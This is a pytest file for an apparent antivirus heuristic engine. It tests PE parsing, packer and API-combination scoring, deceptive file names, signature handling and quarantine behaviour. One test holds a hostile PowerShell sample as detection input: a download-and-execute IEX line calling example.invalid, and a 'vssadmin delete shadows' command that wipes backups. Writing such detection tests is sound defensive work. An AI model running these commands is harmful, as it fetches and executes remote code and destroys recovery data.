"""Test del motore euristico PiumaHeur (campioni innocui in tests/fixtures)."""

import os
import shutil
from pathlib import Path

import pytest

from piuma.config import Config
from piuma.heuristic import HeuristicEngine, analyze_script, heur_score, parse_pe
from piuma.scanner import Scanner

FIX = Path(__file__).parent / "fixtures"


@pytest.fixture
def eng():
    return HeuristicEngine(signature_check=None)


def score(eng, path):
    return eng.analyze(str(path)).score


def test_parse_pe_reads_imports():
    pe = parse_pe((FIX / "keylog_test.exe").read_bytes())
    funcs = set().union(*pe.imports.values())
    assert {"setwindowshookexa", "getasynckeystate", "urldownloadtofilea", "winexec"} <= funcs
    assert any(s.executable for s in pe.sections) and not pe.has_signature


def test_clean_program_is_quiet(eng):
    assert score(eng, FIX / "hello.exe") < 30


def test_packed_program_alerts_but_is_not_quarantined(eng):
    s = score(eng, FIX / "hello_upx.exe")
    assert 60 <= s < 90          # UPX lo usano anche programmi legittimi: solo avviso


def test_suspicious_api_combos(eng):
    assert score(eng, FIX / "keylog_test.exe") >= 60
    v = eng.analyze(str(FIX / "inject_test.exe"))
    assert any("iniezione" in r for r in v.reasons)


def test_deceptive_names(eng, tmp_path):
    for name in ("fattura.pdf.exe", "foto\u202egpj.exe"):
        p = tmp_path / name
        shutil.copy(FIX / "hello.exe", p)
        assert score(eng, p) >= 60, name
    disguised = tmp_path / "contratto.docx"
    shutil.copy(FIX / "hello.exe", disguised)
    assert score(eng, disguised) >= 60          # eseguibile travestito da documento


def test_valid_signature_lowers_score(tmp_path):
    from piuma import heuristic
    data = bytearray((FIX / "keylog_test.exe").read_bytes())
    pe = parse_pe(bytes(data))
    pe.has_signature = True
    trusted = heuristic.analyze_pe(pe, "x.exe", signature_check=lambda p: True)
    forged = heuristic.analyze_pe(pe, "x.exe", signature_check=lambda p: False)
    assert trusted.score < 30 and forged.score > trusted.score + 60


def test_scripts():
    bad = ("$a=[char]73+[char]69+[char]88+[char]32+[char]40+[char]78+[char]101+[char]119+[char]45\n"
           "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/x')\n"
           "vssadmin delete shadows /all /quiet\n")
    assert analyze_script(bad).score >= 90
    good = "Write-Host 'Backup'\nCopy-Item C:\\dati D:\\backup -Recurse\nGet-ChildItem | Sort-Object Name\n"
    assert analyze_script(good).score == 0


def test_garbage_files_do_not_crash(eng, tmp_path):
    for i, blob in enumerate([b"MZ" + b"\0" * 100, b"MZ" + os.urandom(5000),
                              b"MZ" + b"\0" * 58 + b"\x40\0\0\0" + b"PE\0\0" + os.urandom(300)]):
        p = tmp_path / f"rotto{i}.exe"
        p.write_bytes(blob)
        eng.analyze(str(p))           # nessuna eccezione


def test_scanner_reports_below_quarantine_threshold(tmp_path):
    cfg = Config(data_dir=tmp_path / "data")
    cfg.notifications = False
    f = tmp_path / "app_upx.exe"
    shutil.copy(FIX / "hello_upx.exe", f)
    sc = Scanner(cfg, HeuristicEngine(signature_check=None))
    rep = sc.scan_paths([str(f)])
    assert rep.threats and rep.threats[0][2] == "solo segnalato" and f.exists()
    assert heur_score(rep.threats[0][1]) >= 60
    g = tmp_path / "fattura.pdf.exe"
    shutil.copy(FIX / "hello_upx.exe", g)
    rep = sc.scan_paths([str(g)])
    assert "quarantena" in rep.threats[0][2] and not g.exists()   # punteggio altissimo: isolato
